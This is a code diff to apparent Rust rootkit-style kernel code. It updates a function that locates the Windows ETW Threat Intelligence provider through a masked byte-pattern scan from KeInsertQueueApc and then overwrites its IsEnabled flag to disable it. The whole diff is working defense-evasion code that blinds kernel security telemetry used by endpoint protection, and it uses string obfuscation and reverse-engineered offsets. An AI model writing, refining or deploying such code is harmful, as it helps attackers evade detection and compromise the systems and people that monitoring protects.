@@ -9,7 +9,7 @@ use crate::{
     address::{get_function_address, get_module_base_address},
     attach::ProcessAttach,
     error::ShadowError,
-    patterns::{ETWTI_PATTERN, scan_for_pattern},
+    patterns::{ETWTI_PATTERN, scan_for_pattern, FULL_PATTERN, scan_for_pattern_masked},
     *,
 };
 
@@ -30,8 +30,7 @@ impl Etw {
     pub unsafe fn etwti_enable_disable(enable: bool) -> Result<NTSTATUS> {
         log::info!("etwti_enable_disable: {} ETWTI", if enable { "Enabling" } else { "Disabling" });
     
-        // Convert the function name for lookup. We're still using KeInsertQueueApc
-        // because it's exported and available.
+        // Convert the function name for lookup using the exported KeInsertQueueApc.
         let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();
         log::debug!("etwti_enable_disable: Function name (Unicode): {:?}", function_name);
     
@@ -42,17 +41,28 @@ impl Etw {
             return Err(ShadowError::FunctionExecutionFailed("MmGetSystemRoutineAddress", line!()));
         }
         log::info!("etwti_enable_disable: Retrieved system routine address: {:p}", function_address);
-    
-        // Scan for the ETWTI structure using the fixed 7-byte pattern.
-        // Use offset = 3 so that the 4-byte relative offset is read correctly,
-        // and final_offset = 7 so that the returned address points immediately after the instruction.
-        let etwi_handle = scan_for_pattern(function_address, &ETWTI_PATTERN, 3, 7, 0x1000)?;
+        const FULL_MASK: &str = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx????????";
+
+        // Use the new masked scanner:
+        // - The mov instruction for r10 starts at offset 28 in FULL_PATTERN.
+        // - The 4-byte relative offset is located 3 bytes into that instruction (28 + 3 = 31).
+        // - The entire mov instruction is 7 bytes long (28 + 7 = 35), which is where we want the pointer to point.
+        let etwi_handle = scan_for_pattern_masked(
+            function_address,
+            &FULL_PATTERN,
+            FULL_MASK,
+            31,  // Offset within the pattern to read the 4-byte relative displacement.
+            35,  // Final pointer adjustment so that the result points immediately after the mov instruction.
+            0x1000,
+        )?;
         log::info!("etwti_enable_disable: Found ETWTI structure at address: {:p}", etwi_handle);
     
-        // Calculate the TRACE_ENABLE_INFO structure address and update its IsEnabled field.
+        // Calculate the TRACE_ENABLE_INFO structure address by applying known offsets.
+        // These offsets (0x20 and 0x60) are derived from reverse engineering.
         let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
         log::info!("etwti_enable_disable: TRACE_ENABLE_INFO located at: {:p}", trace_info);
         let new_state = if enable { 0x01 } else { 0x00 };
+    
         (*trace_info).IsEnabled = new_state;
         log::info!("etwti_enable_disable: Set TRACE_ENABLE_INFO::IsEnabled to {:#x}", new_state);
     
